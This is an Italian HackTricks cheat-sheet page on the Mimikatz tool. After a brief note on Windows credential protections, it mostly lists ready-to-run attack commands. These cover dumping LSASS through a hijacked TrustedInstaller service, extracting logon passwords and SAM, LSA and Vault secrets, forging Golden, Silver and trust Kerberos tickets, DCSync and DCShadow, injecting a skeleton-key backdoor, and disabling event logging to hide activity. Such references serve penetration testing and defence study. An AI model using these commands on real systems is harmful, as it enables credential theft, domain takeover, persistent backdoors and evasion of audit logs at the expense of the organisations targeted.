# Mimikatz

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata su HackTricks**? O vuoi avere accesso all'**ultima versione di PEASS o scaricare HackTricks in PDF**? Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **e al** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Questa pagina si basa su una pagina di [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Consulta l'originale per ulteriori informazioni!

## LM e testo in chiaro in memoria

A partire da Windows 8.1 e Windows Server 2012 R2, sono state implementate misure significative per proteggere contro il furto delle credenziali:

- **Le hash LM e le password in testo in chiaro** non vengono più memorizzate in memoria per migliorare la sicurezza. È necessario configurare una specifica impostazione del registro, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, con un valore DWORD di `0` per disabilitare l'autenticazione Digest, garantendo che le password "in chiaro" non vengano memorizzate nella memoria LSASS.

- **LSA Protection** è stata introdotta per proteggere il processo Local Security Authority (LSA) dalla lettura non autorizzata della memoria e dall'iniezione di codice. Questo viene realizzato contrassegnando LSASS come un processo protetto. L'attivazione di LSA Protection comporta:
1. Modificare il registro in _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ impostando `RunAsPPL` su `dword:00000001`.
2. Implementare un oggetto di criteri di gruppo (GPO) che impone questa modifica del registro su dispositivi gestiti.

Nonostante queste protezioni, strumenti come Mimikatz possono aggirare LSA Protection utilizzando driver specifici, anche se tali azioni sono probabilmente registrate nei log degli eventi.

### Contrasto alla rimozione di SeDebugPrivilege

Gli amministratori di solito hanno SeDebugPrivilege, che consente loro di eseguire il debug dei programmi. Questo privilegio può essere limitato per impedire il dump non autorizzato della memoria, una tecnica comune utilizzata dagli attaccanti per estrarre le credenziali dalla memoria. Tuttavia, anche con questo privilegio rimosso, l'account TrustedInstaller può ancora eseguire il dump della memoria utilizzando una configurazione del servizio personalizzata:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Questo consente di eseguire il dumping della memoria di `lsass.exe` su un file, che può poi essere analizzato su un altro sistema per estrarre le credenziali:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Opzioni di Mimikatz

La manipolazione dei log degli eventi in Mimikatz coinvolge due azioni principali: la cancellazione dei log degli eventi e la modifica del servizio Eventi per impedire la registrazione di nuovi eventi. Di seguito sono riportati i comandi per eseguire queste azioni:

#### Cancellazione dei log degli eventi

- **Comando**: Questa azione mira a eliminare i log degli eventi, rendendo più difficile tracciare attività malevole.
- Mimikatz non fornisce un comando diretto nella sua documentazione standard per cancellare i log degli eventi direttamente tramite la riga di comando. Tuttavia, la manipolazione dei log degli eventi di solito comporta l'uso di strumenti di sistema o script esterni a Mimikatz per cancellare log specifici (ad esempio, utilizzando PowerShell o Windows Event Viewer).

#### Funzionalità sperimentale: Modifica del servizio Eventi

- **Comando**: `event::drop`
- Questo comando sperimentale è progettato per modificare il comportamento del servizio di registrazione eventi, impedendo efficacemente la registrazione di nuovi eventi.
- Esempio: `mimikatz "privilege::debug" "event::drop" exit`

- Il comando `privilege::debug` garantisce che Mimikatz operi con i privilegi necessari per modificare i servizi di sistema.
- Il comando `event::drop` modifica quindi il servizio di registrazione eventi.


### Attacchi ai biglietti Kerberos

### Creazione di un Golden Ticket

Un Golden Ticket consente l'impersonificazione dell'accesso a livello di dominio. Comando chiave e parametri:

- Comando: `kerberos::golden`
- Parametri:
- `/domain`: Il nome del dominio.
- `/sid`: L'identificatore di sicurezza (SID) del dominio.
- `/user`: Il nome utente da impersonare.
- `/krbtgt`: L'hash NTLM dell'account di servizio KDC del dominio.
- `/ptt`: Inietta direttamente il biglietto in memoria.
- `/ticket`: Salva il biglietto per un uso successivo.

Esempio:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Creazione di Silver Ticket

I Silver Ticket concedono l'accesso a servizi specifici. Ecco il comando chiave e i relativi parametri:

- Comando: Simile al Golden Ticket ma mira a servizi specifici.
- Parametri:
- `/service`: Il servizio da mirare (ad esempio, cifs, http).
- Altri parametri simili al Golden Ticket.

Esempio:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Creazione di Trust Ticket

I Trust Ticket vengono utilizzati per accedere alle risorse tra domini sfruttando le relazioni di trust. Comando chiave e parametri:

- Comando: Simile a Golden Ticket ma per le relazioni di trust.
- Parametri:
- `/target`: L'FQDN del dominio di destinazione.
- `/rc4`: l'hash NTLM per l'account di trust.

Esempio:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Comandi Kerberos aggiuntivi

- **Elenco dei ticket**:
- Comando: `kerberos::list`
- Elenca tutti i ticket Kerberos per la sessione utente corrente.

- **Passa la cache**:
- Comando: `kerberos::ptc`
- Inietta i ticket Kerberos dai file di cache.
- Esempio: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Passa il ticket**:
- Comando: `kerberos::ptt`
- Consente di utilizzare un ticket Kerberos in un'altra sessione.
- Esempio: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Pulisci i ticket**:
- Comando: `kerberos::purge`
- Cancella tutti i ticket Kerberos dalla sessione.
- Utile prima di utilizzare comandi di manipolazione dei ticket per evitare conflitti.


### Manipolazione di Active Directory

- **DCShadow**: Rendi temporaneamente una macchina un DC per la manipolazione degli oggetti AD.
- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Simula un DC per richiedere dati sulla password.
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Accesso alle credenziali

- **LSADUMP::LSA**: Estrae le credenziali da LSA.
- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Si finge un DC utilizzando i dati sulla password di un account computer.
- *Nessun comando specifico fornito per NetSync nel contesto originale.*

- **LSADUMP::SAM**: Accede al database SAM locale.
- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Decifra i segreti memorizzati nel registro.
- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Imposta un nuovo hash NTLM per un utente.
- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Recupera le informazioni di autenticazione della trust.
- `mimikatz "lsadump::trust" exit`

### Varie

- **MISC::Skeleton**: Inietta un backdoor in LSASS su un DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Escalation dei privilegi

- **PRIVILEGE::Backup**: Acquisisce i diritti di backup.
- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Ottiene i privilegi di debug.
- `mimikatz "privilege::debug" exit`

### Dumping delle credenziali

- **SEKURLSA::LogonPasswords**: Mostra le credenziali degli utenti connessi.
- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Estrae i ticket Kerberos dalla memoria.
- `mimikatz "sekurlsa::tickets /export" exit`

### Manipolazione di SID e token

- **SID::add/modify**: Modifica SID e SIDHistory.
- Aggiungi: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modifica: *Nessun comando specifico per la modifica nel contesto originale.*

- **TOKEN::Elevate**: Si finge token.
- `mimikatz "token::elevate /domainadmin" exit`

### Servizi terminal

- **TS::MultiRDP**: Consente sessioni RDP multiple.
- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Elenca le sessioni TS/RDP.
- *Nessun comando specifico fornito per TS::Sessions nel contesto originale.*

### Vault

- Estrae le password da Windows Vault.
- `mimikatz "vault::cred /patch" exit`


<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata in HackTricks**? o vuoi avere accesso all'**ultima versione di PEASS o scaricare HackTricks in PDF**? Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **e al** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
